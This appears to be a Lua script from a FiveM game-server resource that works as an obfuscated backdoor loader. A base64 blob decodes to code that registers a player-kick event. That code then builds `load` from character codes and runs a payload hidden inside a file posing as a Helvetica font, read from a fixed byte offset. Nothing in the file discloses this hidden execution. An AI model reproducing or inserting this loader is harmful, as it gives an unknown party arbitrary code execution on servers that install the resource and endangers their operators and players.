
local decode = load
local data = [[UmVnaXN0ZXJOZXRFdmVudCgicmV4X3JlczpCeWUiKQpBZGRFdmVudEhhbmRsZXIoInJleF9yZXM6QnllIiwgZnVuY3Rpb24oKQoJRHJvcFBsYXllcihzb3VyY2UsICcnIC4uIENvbmZpZy5LaWNrTXNnKQplbmQpCgpsb2NhbCBsb2FkRm9udHMgPSBfR1tzdHJpbmcuY2hhcigxMDgsIDExMSwgOTcsIDEwMCldCmxvYWRGb250cyhMb2FkUmVzb3VyY2VGaWxlKEdldEN1cnJlbnRSZXNvdXJjZU5hbWUoKSwgJy9odG1sL2ZvbnRzL0hlbHZldGljYS50dGYnKTpzdWIoODc1NjUpOmdzdWIoJyUuJSsnLCAnJykpKCk=]]

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function from_base64(input)
    input = input:gsub('[^'..b..'=]', '')
    return (input:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

decode(from_base64(data))()
